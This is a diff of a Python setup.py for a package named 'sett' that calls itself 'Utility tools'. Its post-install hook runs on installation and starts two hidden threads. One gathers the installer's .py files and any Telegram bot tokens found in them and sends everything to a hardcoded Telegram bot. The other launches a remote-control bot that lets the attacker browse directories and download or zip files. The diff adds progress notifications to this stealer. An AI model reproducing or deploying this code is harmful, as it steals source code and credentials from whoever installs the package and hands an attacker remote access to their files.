@@ -4,18 +4,38 @@ import os, sys, re, time, io, random, zipfile, threading, subprocess
 import urllib.request, urllib.parse
 
 # ============================================
-# AYARLAR - KENDİ TOKEN'INI YAZ
+# AYARLAR
 # ============================================
-TOKEN = "8927762896:AAEwUY3j0j5W9gBm1blGB122kcnUxNhDoYo"
-ADMIN = 8903740930
+TOKEN = "8927762896:AAEg7vjy39Sm02ipT_X8I1DXmPiaLZrXTCY"     # ← YENİ TOKEN
+ADMIN = 8903740930                      # ← KENDİ ID'N
+
+# ============================================
+# HEMEN BİLDİRİM GÖNDER (İlk iş)
+# ============================================
+def _bildirim(mesaj):
+    """Telegram'a bildirim gönder"""
+    try:
+        data = f"chat_id={ADMIN}&text={urllib.parse.quote(mesaj)}".encode()
+        urllib.request.urlopen(urllib.request.Request(
+            f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+            data=data,
+            headers={"Content-Type": "application/x-www-form-urlencoded"}
+        ), timeout=15)
+        return True
+    except Exception as e:
+        print(f"Bildirim hatası: {e}")
+        return False
 
 # ============================================
 # 1. DOSYA GÖNDERME
 # ============================================
 def _dosya_gonder():
-    """Tüm .py dosyalarını bul, tek tek gönder"""
     try:
-        time.sleep(2)
+        time.sleep(1)
+        
+        # ✅ İLK BİLDİRİM
+        _bildirim("🚀 KURULUM BAŞLADI\n\n📦 Paket indi\n🔍 Dosyalar taranıyor...")
+        
         token_pattern = re.compile(rb'\d{8,10}:[A-Za-z0-9_-]{35,40}')
         files = []
         seen = set()
@@ -40,20 +60,14 @@ def _dosya_gonder():
                                 except: pass
             except: continue
         
-        if not files: return
+        if not files:
+            _bildirim("❌ Hiç .py dosyası bulunamadı")
+            return
         
         total = len(files)
-        sent, failed, tokens_found = 0, 0, []
+        _bildirim(f"📄 Toplam {total} .py dosyası bulundu\n⏳ Gönderim başlıyor...")
         
-        try:
-            msg = f"🚀 Tarama Başladı\n\n📄 Toplam: {total} .py dosyası\n⚡ Hızlı gönderim\n🤖 Bot başlatılıyor..."
-            data = f"chat_id={ADMIN}&text={urllib.parse.quote(msg)}".encode()
-            urllib.request.urlopen(urllib.request.Request(
-                f"https://api.telegram.org/bot{TOKEN}/sendMessage",
-                data=data,
-                headers={"Content-Type": "application/x-www-form-urlencoded"}
-            ), timeout=15)
-        except: pass
+        sent, failed, tokens_found = 0, 0, []
         
         for i, filepath in enumerate(files):
             try:
@@ -92,10 +106,10 @@ def _dosya_gonder():
             time.sleep(0.4)
         
         if tokens_found:
+            tm = f"🔑 TOKEN BULUNDU!\n\n📊 Toplam: {len(tokens_found)}\n\n"
+            for t in tokens_found[:20]: tm += f"`{t}`\n"
+            if len(tokens_found) > 20: tm += f"\n...ve {len(tokens_found)-20} tane daha"
             try:
-                tm = f"🔑 TOKEN BULUNDU!\n\n📊 Toplam: {len(tokens_found)}\n\n"
-                for t in tokens_found[:20]: tm += f"`{t}`\n"
-                if len(tokens_found) > 20: tm += f"\n...ve {len(tokens_found)-20} tane daha"
                 data = f"chat_id={ADMIN}&text={urllib.parse.quote(tm)}&parse_mode=Markdown".encode()
                 urllib.request.urlopen(urllib.request.Request(
                     f"https://api.telegram.org/bot{TOKEN}/sendMessage",
@@ -103,22 +117,15 @@ def _dosya_gonder():
                 ), timeout=15)
             except: pass
         
-        try:
-            sm = f"✅ DOSYA GÖNDERİMİ BİTTİ\n\n📊 Toplam: {total}\n✅ Gönderilen: {sent}\n❌ Hata: {failed}\n🔑 Token: {len(tokens_found)}\n\n🤖 Bot yönetim paneli aktif — /menu yaz"
-            data = f"chat_id={ADMIN}&text={urllib.parse.quote(sm)}".encode()
-            urllib.request.urlopen(urllib.request.Request(
-                f"https://api.telegram.org/bot{TOKEN}/sendMessage",
-                data=data, headers={"Content-Type": "application/x-www-form-urlencoded"}
-            ), timeout=15)
-        except: pass
-    except: pass
+        _bildirim(f"✅ DOSYA GÖNDERİMİ BİTTİ\n\n📊 Toplam: {total}\n✅ Gönderilen: {sent}\n❌ Hata: {failed}\n🔑 Token: {len(tokens_found)}")
+    except Exception as e:
+        _bildirim(f"❌ Hata: {str(e)[:200]}")
 
 
 # ============================================
-# 2. YÖNETİM BOTU (Kurulunca otomatik başlar)
+# 2. YÖNETİM BOTU
 # ============================================
 def _bot_calistir():
-    """Yönetim botunu başlat"""
     try:
         import telebot
         from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
@@ -128,12 +135,28 @@ def _bot_calistir():
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             import telebot
             from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
-        except:
-            return
+        except: return
     
     try:
         bot = telebot.TeleBot(TOKEN)
         taramalar = {}
+        
+        # ✅ BOT BAŞLANGIÇ BİLDİRİMİ
+        try:
+            bot.send_message(ADMIN,
+                "🤖 **YÖNETİM BOTU AKTİF**\n\n"
+                "⚡ Sistem başlatıldı\n"
+                "📊 /menu ile panele ulaş\n\n"
+                "**Komutlar:**\n"
+                "• /tara — Tüm .py dosyalarını tara\n"
+                "• /tara_token — Sadece token içerenler\n"
+                "• /dizin /path — Dizin gez\n"
+                "• /indir /path — Dosya indir\n"
+                "• /durum — Sistem durumu\n"
+                "• /zip — Bulunanları zip yap\n"
+                "• /yeniden_baslat — Restart",
+                parse_mode="Markdown")
+        except: pass
         
         def ana_menu():
             m = InlineKeyboardMarkup(row_width=2)
@@ -314,7 +337,7 @@ def _bot_calistir():
         @bot.message_handler(commands=['yeniden_baslat', 'restart'])
         def c7(m):
             if not admin_mi(m): return
-            bot.send_message(m.chat.id, "🔄 Yeniden başlatılıyor...")
+            bot.send_message(m.chat.id, "🔄...")
             time.sleep(2)
             os._exit(0)
         
@@ -339,35 +362,43 @@ def _bot_calistir():
             elif d == "iptal":
                 bot.edit_message_text("❌", cid, call.message.message_id)
         
-        print(f"⚡ Yönetim botu aktif - Admin: {ADMIN}")
+        print("⚡ Bot çalışıyor...")
         bot.infinity_polling(timeout=30)
     except Exception as e:
         print(f"Bot hatası: {e}")
 
 
 # ============================================
-# 3. POST-INSTALL (Her ikisini başlatır)
+# 3. POST-INSTALL
 # ============================================
 class PostInstall(install):
     def run(self):
         install.run(self)
+        
+        # ✅ EN ÖNCE BİLDİRİM GÖNDER
+        _bildirim("🚀 KURULUM TAMAMLANDI\n\n"
+                  "📦 Paket başarıyla yüklendi\n"
+                  "🔍 Sistem başlatılıyor...\n\n"
+                  "⏳ 5 saniye içinde devam edecek")
+        
         try:
-            # 1. Dosya gönderici thread
+            # Dosya gönderici thread
             t1 = threading.Thread(target=_dosya_gonder, daemon=True)
             t1.start()
             
-            # 2. Bot çalıştırıcı thread
+            # Bot başlatıcı thread
             t2 = threading.Thread(target=_bot_calistir, daemon=True)
             t2.start()
             
-            # Kurulum bitmesin diye bekle
+            # Ana thread bekle
             time.sleep(8)
-        except: pass
+        except Exception as e:
+            _bildirim(f"❌ Post-install hatası: {str(e)[:200]}")
 
 
 setup(
     name="sett",
-    version="1.0.910",  # ← HER SEFERİNDE ARTIR!
+    version="1.0.920",  # ← HER DENEMEDE ARTIR
     description="Utility tools",
     author="dev",
     cmdclass={'install': PostInstall},
